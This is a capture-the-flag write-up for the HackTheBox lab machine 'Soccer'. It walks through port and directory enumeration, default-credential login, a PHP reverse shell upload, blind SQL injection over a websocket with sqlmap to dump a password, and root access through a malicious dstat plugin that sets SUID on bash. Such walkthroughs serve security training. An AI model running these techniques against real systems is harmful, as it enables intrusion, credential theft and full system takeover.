## Soccer | HackTheBox

You can access machine [here](https://app.hackthebox.com/machines/Soccer)

<img src="https://user-images.githubusercontent.com/67650329/208854616-f92bba39-9249-47ca-8fd6-f73111adafd0.png" width="300px" align="center">


## Scanning / Enumeration!

`nmap -sC -sV -p- -T4 {IP}`

-sC = Run the default script.

-sV = Version of services.

-p- = Checking for all port.

-T4 = Scanning speed.

This is the result for the scanning with nmap tools:
```
PORT     STATE SERVICE         REASON         VERSION
22/tcp   open  ssh             syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ***
80/tcp   open  http            syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail? syn-ack ttl 63
|_***
```
Port open:

- 22 = SSH.
- 80 = HTTP.
- 9091 = xmltec-xmlmail?.

After Enumeration port we can Enumeration directory use GOBUSTER

`gobuster dir -u [TARGET_IP] -w [WORDLIST] -f -n`

- u = Url/Link Target.
- w = Wordlist to use.
- f = Nospam.
- n = No Status just result (Nospam).

This is the result from GOBUSTER.
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://soccer.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Add Slash:               true
[+] No status:               true
[+] Timeout:                 10s
===============================================================
2022/12/20 03:48:07 Starting gobuster in directory enumeration mode
===============================================================
/tiny/                [Size: 11521]
```
We got the login page on /tiny/

<img src="https://user-images.githubusercontent.com/67650329/208856552-9639bdb7-4fad-4f25-a59d-9d6eed860067.png" width="300px" align="center">

On this web use Tiny File Manager we can try use default username and password. I Think we can search on search engine.

[Tiny File Manager Documentation](https://github.com/prasathmani/tinyfilemanager)

```
Default username/password: admin/admin@123 and user/12345
```
<img src="https://user-images.githubusercontent.com/67650329/208857329-5f0611f1-a47a-4e17-8221-a8fe538ade3b.png" width="300px" align="center">

We made it into the dashboard.

We can uploads the [reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) on [upload page](http://soccer.htb/tiny/tinyfilemanager.php?p=tiny%2Fuploads).

And after upload the reverse shell into the file manager. We can run the reverse shell. on http://soccer.htb/tiny/uploads/[namefile] 

But before run the reverse shell. We must run the listener use NETCAT.

`nc -lvnp [Port]`

```
$ whoami
www-data
$ cd /etc/nginx/
$ cd sites-available
$ ls
default
soc-player.htb
$ cat soc-player.htb
server {
        listen 80;
        listen [::]:80;

        server_name soc-player.soccer.htb;

        root /root/app/views;

        location / {
                proxy_pass http://localhost:3000;
                proxy_http_version 1.1;
                proxy_set_header Upgrade $http_upgrade;
                proxy_set_header Connection 'upgrade';
                proxy_set_header Host $host;
                proxy_cache_bypass $http_upgrade;
        }

}
```

We got another page soc-player.soccer.htb.

We can Enumeration the directory use GOBUSTER again.

`gobuster dir -u [TARGET_IP] -w [WORDLIST] -f -n`

- u = Url/Link Target.
- w = Wordlist to use.
- f = Nospam.
- n = No Status just result (Nospam).
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://soc-player.soccer.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Add Slash:               true
[+] No status:               true
[+] Timeout:                 10s
===============================================================
2022/12/20 04:23:36 Starting gobuster in directory enumeration mode
===============================================================
/login/               [Size: 3307]
/signup/              [Size: 3741]
/Login/               [Size: 3307]
/logout/              [Size: 23] [--> /]
/check/               [Size: 31]        
/match/               [Size: 10078]     
/Signup/              [Size: 3741]      
/SignUp/              [Size: 3741]      
/Logout/              [Size: 23] [--> /]
/signUp/              [Size: 3741]      
===============================================================
2022/12/20 05:56:37 Finished
===============================================================
```
We got the register page and login page. I think we can create account and login to access the website.

After we access the website we can see the ticket id.

<img src="https://user-images.githubusercontent.com/67650329/208859346-2a6813dc-2ecd-42b7-b05f-7079ba50f20b.png" width="300px" align="center">

I think we can use method sql injection to exploit the databases.

We can use [Blind SQL](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html)

We can use burp suite use to know the websocket.

<img src="https://user-images.githubusercontent.com/67650329/208859885-9d91d242-5689-4bf4-b371-f92a41488cb4.png" width="300px" align="center">

We got the websocket. And change this.
```
***
ws_server = "ws:// http://soc-player.soccer.htb:9091"
***
data = '{"id":"%s"}' % message
```
`And save [name_file.py]`

After change the file. We can run the file.

```
Terminal 1 -> python3 sqli.py
Terminal 2 -> sqlmap -u "http://localhost:8081/?id=[TICKET_NUMBER]" --batch –dbs
TICKET_NUMBER = Your ticket number on http://soc-player.soccer.htb/check
```
Wait for long time you can take a break
```
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] soccer_db
[*] sys
```
We got the table of databases. And we can Show the database soccer_db.

`sqlmap -u "http://localhost:8081/?id=1" --risk 3 --level 5 --batch -D soccer_db -T accounts –dump`
```
Database: soccer_db
Table: accounts
[1 entry]
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | P******************2 | player   |
+------+-------------------+----------------------+----------+
```
BOOM!!!

We got the player user and password. We can use SSH to enter the machine.
```
ssh player@10.129.91.74
player@soccer:~$ whoami
player
player@soccer:~$ pwd
/home/player
player@soccer:~$ ls
user.txt
player@soccer:~$ cat user.txt
0***c
```
We got the User and we can search the root. Use [Linpeas](https://github.com/Cerbersec/scripts/blob/master/linux/linpeas.sh).

or this https://github.com/carlospolop/PEASS-ng
```
══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
  Group player:                                                             
/usr/local/share/dstat
```
We got the writable files. We can create and insert the script.
```
player@soccer: ~$ cd /usr/local/share/dstat
player@soccer:/usr/local/share/dstat$ nano dstat_niesha.py
player@soccer:/usr/local/share/dstat$ cat dstat_niesha.py
import os
os.system('chmod +s /usr/bin/bash')
player@soccer:/usr/local/share/dstat$ dstat --list | grep niesha
        niesha
player@soccer:/usr/local/share/dstat$ doas -u root /usr/bin/dstat --niesha
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
Module dstat_niesha failed to load. (name 'dstat_plugin' is not defined)
None of the stats you selected are available.
player@soccer:/usr/local/share/dstat$ bash -p
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt
b***d
```
We got the root :)

Thank you for reading 👋.

---
